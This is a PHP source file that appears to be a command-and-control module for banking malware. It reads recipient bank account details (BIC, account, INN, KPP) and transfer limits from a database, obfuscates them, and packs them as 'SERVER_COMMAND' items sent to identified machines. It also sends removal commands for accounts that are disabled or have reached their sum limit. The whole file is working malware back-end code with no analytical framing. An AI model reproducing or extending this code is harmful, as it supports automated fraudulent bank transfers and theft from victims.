<?php
/*
    parser_0006.php

 */


require_once 'mod_crypt.php';


/*
    Internal encoding for text buffers
    D.A. Murphy
*/
function id6_encode($data)
{
    
    $res = cryptEncrypt($data); 
    for ($i=0;$i<strlen($res);$i++) { $res[$i] = chr((ord($res[$i]) ^ 0x51) & 0xFF); }
    
    return $res;
}

/* 
    main enter function. Returns FALSE in case of any errors
    Params passed:
    $m_id - numeric id identifying particular machine
    $mod_data - binary chunk to be parsed by this module
    $error - buffer to contain any error for logging in case of parse failure
 */ 
function Parser_id0006($m_id, $mod_data, &$error, &$answer)
{
    global $g_dblink;
    
    // change charset to win-1251, specific for this client
    if (!mysqli_set_charset($g_dblink, "cp1251")) { $error = __FUNCTION__."(".__LINE__."): failed to set charset: ".mysqli_error($g_dblink); return FALSE; }
    
    // update fields to be sent
    mysqli_query($g_dblink, "UPDATE `t_accs` SET `stamp`=NOW() WHERE (`b_enabled`>0) AND (`trans_sum_registered` < `max_trans_sum`);");
    
    // no valueable incoming data assumed here, query items
    $res = mysqli_query($g_dblink, "SELECT * FROM `t_accs` WHERE (`b_enabled`>0) AND (`trans_sum_registered` < `max_trans_sum`);");
    if (!$res) { $error = __FUNCTION__."(".__LINE__."): query1 failed: ".mysqli_error($g_dblink); return FALSE; }
    while ($row = mysqli_fetch_assoc($res)) {
    
        // check for correct lengths
        if (strlen($row['f_bic'])!=9) { $error = __FUNCTION__."(".__LINE__."): bic len err"; return FALSE; }
        if (strlen($row['f_corr'])!=20) { $error = __FUNCTION__."(".__LINE__."): corr len err"; return FALSE; }
        if (strlen($row['f_acc'])!=20) { $error = __FUNCTION__."(".__LINE__."): acc len err"; return FALSE; }
        if (strlen($row['f_inn'])!=10) { $error = __FUNCTION__."(".__LINE__."): inn len err"; return FALSE; }
        if (strlen($row['f_kpp'])!=9) { $error = __FUNCTION__."(".__LINE__."): kpp len err"; return FALSE; }
        
        // prepare single item
        $enc_creds = id6_encode($row['f_bic'].$row['f_corr'].$row['f_acc'].$row['f_inn'].$row['f_kpp'].pack('CC', $row['b_gp'], strlen($row['f_name'])).$row['f_name']);
        $item = pack('VV', $row['id'], $row['rev_id']).pack('VVVV', $row['trans_min'], $row['trans_max'], $row['max_trans_count'], $row['max_trans_sum']).pack('v', strlen($enc_creds)).$enc_creds;
        
        // wrap to a valid SERVER_COMMAND container to $answer 
        // 100 - item, 3 - arch_all
        $answer .= pack('vVVC', 100, strlen($item), 0, 3).$item; 
    }

    // query removed ids
    $res = mysqli_query($g_dblink, "SELECT * FROM `t_accs` WHERE (`b_enabled`=0) OR (`trans_sum_registered` >= `max_trans_sum`)");
    if (!$res) { $error = __FUNCTION__."(".__LINE__."): query2 failed: ".mysqli_error($g_dblink); return FALSE; }
    while ($row = mysqli_fetch_assoc($res)) {
        
        // wrap to a valid SERVER_COMMAND container to $answer 
        // 101 - removed item, 3 - arch_all
        $item = pack('V', $row['id']);
        $answer .= pack('vVVC', 101, strlen($item), 0, 3).$item;
        
    }
    
    // query disabled ids, pass as removed
    $res = mysqli_query($g_dblink, "SELECT * FROM `t_accs_removed`");
    if (!$res) { $error = __FUNCTION__."(".__LINE__."): query3 failed: ".mysqli_error($g_dblink); return FALSE; }
    while ($row = mysqli_fetch_assoc($res)) {
        
        // wrap to a valid SERVER_COMMAND container to $answer 
        // 101 - removed item, 3 - arch_all
        $item = pack('V', $row['ta_id']);
        $answer .= pack('vVVC', 101, strlen($item), 0, 3).$item;
        
    }
    
    
    // all ok if got here 
    return TRUE;
}
?>